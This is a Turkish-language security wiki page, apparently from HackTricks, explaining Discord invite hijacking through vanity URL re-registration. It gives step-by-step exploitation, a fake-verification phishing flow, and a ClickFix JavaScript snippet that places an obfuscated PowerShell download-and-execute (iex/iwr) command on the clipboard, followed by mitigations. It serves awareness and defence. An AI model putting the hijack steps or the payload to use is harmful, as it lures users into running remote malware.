# Discord Invite Hijacking

Discord invite hijacking, özel vanity link'ler için yeniden kullanım kurallarını kötüye kullanır: süresi dolmuş bir temporary invite code veya yalnızca küçük harfler ve rakamlardan oluşan silinmiş bir permanent code, Level 3 boosted server üzerinde vanity link olarak kaydedilebilir. Özel bir vanity link, orijinal server Level 3 Boost seviyesini kaybettiğinde de kullanılabilir hâle gelebilir; büyük harf içeren bir temporary invite için attacker, normal invite aktif kalırken küçük harfli vanity biçimini önceden kaydedebilir, ancak yönlendirme yalnızca bu invite süresi dolduktan sonra başlar.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

Gözlemlenen risk, invite türüne göre değişir:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Süresi dolduktan sonra code kullanılabilir hâle gelir ve boosted server tarafından vanity URL olarak yeniden kaydedilebilir. |
| Permanent Invite Link | ⚠️          | Silinmişse ve yalnızca küçük harfler ile rakamlardan oluşuyorsa code yeniden kullanılabilir hâle gelebilir.        |
| Custom Vanity Link    | ✅          | Orijinal server Level 3 Boost seviyesini kaybederse vanity invite yeni kayıtlar için kullanılabilir hâle gelir.    |

## Exploitation Steps

1. Reconnaissance
- `discord.gg/{code}` veya `discord.com/invite/{code}` kalıbıyla eşleşen invite link'leri için public sources (forums, social media, Telegram channels) izleyin.<sup>[[1]](#references)</sup>
- İlgilenilen invite code'larını (temporary veya vanity) toplayın.<sup>[[1]](#references)</sup>
2. Pre-registration
- Level 3 Boost yetkilerine sahip bir Discord server oluşturun veya mevcut bir server kullanın.<sup>[[1]](#references)[[2]](#references)</sup>
- **Server Settings → Vanity URL** bölümünde hedef invite code'unu atamayı deneyin. Kabul edilirse code malicious server tarafından rezerve edilir.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Temporary invite'lar için orijinal invite'ın süresi dolana kadar bekleyin (veya source'u kontrol ediyorsanız invite'ı manuel olarak silin).<sup>[[1]](#references)</sup>
- Büyük harf içeren code'lar için küçük harfli varyant hemen claim edilebilir, ancak yönlendirme yalnızca süresi dolduktan sonra etkinleşir.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Eski link'i ziyaret eden kullanıcılar, hijack aktif olduğunda sorunsuz şekilde attacker-controlled server'a gönderilir.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Server channels'ı yalnızca bir **#verify** channel görünecek şekilde kısıtlayın.<sup>[[1]](#references)</sup>
2. Yeni gelenlerden OAuth2 aracılığıyla verify olmalarını istemek için bir bot (ör. **Safeguard#0786**) deploy edin.<sup>[[1]](#references)</sup>
3. Bot, kullanıcıları CAPTCHA veya verification adımı görünümü altında bir phishing site'ına (ör. `captchaguard.me`) redirect eder.<sup>[[1]](#references)</sup>
4. **ClickFix** UX trick'ini uygulayın:<sup>[[1]](#references)</sup>
- Bozuk bir CAPTCHA mesajı görüntüleyin.
- Kullanıcılara **Win+R** dialog'unu açmalarını, önceden yüklenmiş bir PowerShell command yapıştırmalarını ve Enter'a basmalarını söyleyin.

### ClickFix Clipboard Injection Example

Campaign, clipboard'a malicious bir PowerShell command kopyalamak için JavaScript kullandı:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Bu yaklaşım, doğrudan dosya indirmelerini önler ve kullanıcı şüphesini azaltmak için tanıdık kullanıcı arayüzü öğelerinden yararlanır.<sup>[[1]](#references)</sup>

## Mitigations

- Kalıcı davet bağlantılarını tercih edin ve kodun en az bir büyük harf içerdiğinden emin olun; büyük harf içeren silinmiş kalıcı kodlar vanity link olarak yeniden kullanılamaz.<sup>[[1]](#references)</sup>
- Davet kodlarını düzenli olarak yenileyin ve eski bağlantıları iptal edin.
- Discord sunucusunun boost durumunu ve vanity URL taleplerini izleyin.<sup>[[1]](#references)[[2]](#references)</sup>
- Kullanıcıları sunucunun gerçekliğini doğrulamaları ve panoya yapıştırılmış komutları çalıştırmaktan kaçınmaları konusunda bilgilendirin.

## References

- [1] [Güvenden Tehdide: Çok Aşamalı Malware Dağıtımı İçin Ele Geçirilen Discord Davetleri](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Özel Davet Bağlantısı – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
